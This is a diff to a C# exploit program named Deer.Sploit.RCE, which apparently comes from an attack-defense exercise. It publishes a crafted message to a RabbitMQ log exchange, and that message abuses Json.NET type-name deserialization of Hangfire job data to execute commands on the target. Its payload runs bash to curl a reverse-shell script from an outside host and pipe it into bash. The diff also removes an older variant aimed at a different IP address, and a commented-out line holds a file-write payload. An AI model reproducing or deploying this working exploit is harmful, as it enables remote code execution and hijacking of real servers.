@@ -11,27 +11,34 @@ using ServerDto = Hangfire.MemoryStorage.Dto.ServerDto;
 
 namespace Deer.Sploit.RCE
 {
-    class Program
+    public class Program
     {
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
-            var host = "localhost";
-            var user = "hacker";
-            var password = "hacker";
+            if (args.Length != 4)
+            {
+                Console.Error.WriteLine("Usage: Deer.Sploit.RCE.dll <host> <user> <password> <exploit url>");
+                return;
+            }
+
+            var host = args[0];
+            var user = args[1];
+            var password = args[2];
+            var exploitUrl = args[3];
             var logExchangeName = $"logs.{user}";
 
             using (var bus = RabbitHutch.CreateBus($"host={host};username={user};password={password}"))
             {
                 var exchange = bus.Advanced.ExchangeDeclare(logExchangeName, ExchangeType.Fanout, passive: true);
 
-                var properties = new MessageProperties{Type = "LogProcessor.Models.ElasticResponse`1[[LogProcessor.HangfireJobServer, LogProcessor]], LogProcessor"};
-                var body = Encoding.UTF8.GetBytes(BuildJson());
+                var properties = new MessageProperties{Type = "Deer.Models.Elasticsearch.ElasticResponse`1[[Deer.Hangfire.HangfireJobServer, Deer]], Deer"};
+                var body = Encoding.UTF8.GetBytes(BuildJson(exploitUrl));
 
                 bus.Advanced.Publish(exchange, "", false, properties, body);
             }
         }
 
-        private static string BuildJson()
+        private static string BuildJson(string exploitUrl)
         {
             var serverDto = new ServerDto
             {
@@ -60,10 +67,8 @@ namespace Deer.Sploit.RCE
                     Data = "{\"EnqueuedAt\":\"2019-08-15T06:09:52.7600490Z\",\"Queue\":\"default\"}",
                     Id = jobQueueId
                 },
-                //InvocationData = "{\"Type\":\"System.IO.File, System.IO.FileSystem, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Method\":\"WriteAllText\",\"ParameterTypes\":\"[\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\",\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\"]\",\"Arguments\":\"[\\\"\\\\\\\"/tmp/hack\\\\\\\"\\\",\\\"\\\\\\\"!!!HACK!!!\\\\\\\\n\\\\\\\"\\\"]\"}",
-                InvocationData = "{\"Type\":\"System.Diagnostics.Process, System.Diagnostics.Process, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Method\":\"Start\",\"ParameterTypes\":\"[\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\",\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\"]\",\"Arguments\":\"[\\\"\\\\\\\"/bin/bash\\\\\\\"\\\",\\\"\\\\\\\"-c \\\\\\\\\\\\\\\"whoami > /tmp/hack3\\\\\\\\\\\\\\\"\\\\\\\"\\\"]\"}",
-                //Arguments = "[\"\\\"/tmp/hack2\\\"\",\"\\\"!!!HACK2!!!\\\\n\\\"\"]",
-                Arguments = "[\"\\\"/bin/bash\\\"\",\"\\\"-c \\\\\\\"curl http://10.34.3.209:8000/reverse-shell.pl|bash\\\\\\\"\\\"\"]",
+                InvocationData = "{\"Type\":\"System.Diagnostics.Process, System.Diagnostics.Process, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Method\":\"Start\",\"ParameterTypes\":\"[\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\",\\\"System.String, System.Private.CoreLib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e\\\"]\"}",
+                Arguments = "[\"\\\"/bin/bash\\\"\",\"\\\"-c \\\\\\\"curl http://192.168.88.253:8000/reverse-shell.pl|bash\\\\\\\"\\\"\"]",
                 CreatedAt = DateTime.UtcNow,
                 Id = jobId,
                 History = new List<StateHistoryDto>(),
@@ -99,9 +104,9 @@ namespace Deer.Sploit.RCE
             var dataJson = $"{{\"Dictionary\" : {JsonConvert.SerializeObject(dataDict, new JsonSerializerSettings{TypeNameHandling = TypeNameHandling.Auto})}}}";
             var memoryStorageJson = $"{{\"$type\":\"Hangfire.MemoryStorage.MemoryStorage, Hangfire.MemoryStorage\", \"Data\" : {dataJson}}}";
 
-            var hangfireJobServerJson = $"{{\"$type\":\"LogProcessor.HangfireJobServer, LogProcessor\", \"storage\" : {memoryStorageJson}}}";
+            var hangfireJobServerJson = $"{{\"$type\":\"Deer.Hangfire.HangfireJobServer, Deer\", \"storage\" : {memoryStorageJson}}}";
 
-            return $"{{\"$type\":\"LogProcessor.Models.ElasticResponse`1[[LogProcessor.HangfireJobServer, LogProcessor]], LogProcessor\", \"json\": {JsonConvert.ToString(hangfireJobServerJson)}}}";
+            return $"{{\"$type\":\"Deer.Models.Elasticsearch.ElasticResponse`1[[Deer.Hangfire.HangfireJobServer, Deer]], Deer\", \"json\": {JsonConvert.ToString(hangfireJobServerJson)}}}";
         }
     }
 }
